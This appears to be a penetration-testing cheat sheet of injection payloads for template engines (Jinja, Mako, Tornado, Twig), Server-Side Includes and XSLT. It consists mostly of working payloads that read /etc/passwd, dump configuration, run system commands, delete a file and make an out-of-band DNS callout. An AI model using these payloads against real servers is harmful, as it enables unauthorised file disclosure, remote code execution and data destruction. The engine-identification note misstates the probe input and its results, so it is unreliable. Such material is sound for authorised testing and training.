# Server-side Template Injection (SSTI)
## Identifying 
```bash
${{<%[%'"}}%\.
{7*7}
```
- Identifying template
<img width="1440" height="943" alt="image" src="https://github.com/user-attachments/assets/a007c8e6-b48c-4d03-b55c-3a900cbb7de8" />

I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Template else if the answer is this 49 is a Twig Template

## Jinja Exploit (python)
```bash
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
# LFI
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
# RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Mako Exploit (python)
```bash
<% print 7*7 %>
<%25+system("rm+/home/carlos/morale.txt")%25> 
```

## Tornado Exploit (python)
```
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

## Twigo Exploit (php)
```bash
{{ _self }}
# LFI
{{ "/etc/passwd"|file_excerpt(1,-1) }}
# RCE
{{ ['id'] | filter('system') }}
```
# Server-Side Includes (SSI) Injection
- File extensions: .shtml, .shtm, and .stm.
- printenv:
```ssi
<!--#printenv -->
```
- config:
```ssi
<!--#config errmsg="Error!" -->
```
- echo:
```ssi
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```
- exec:
```ssi
<!--#exec cmd="whoami" -->
```
- include:
```ssi
<!--#include virtual="index.html" -->
```
# eXtensible Stylesheet Language Transformation (XSLT) Injection
## Identifying
<img width="1549" height="247" alt="image" src="https://github.com/user-attachments/assets/0e4a2ee1-d154-40e0-9b1c-ddfa6eb84f7a" />

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

## Explotation
```bash
# LFI
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
## XSLT version 2.0 and PHP
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
# RCE
<xsl:value-of select="php:function('system','id')" />
```
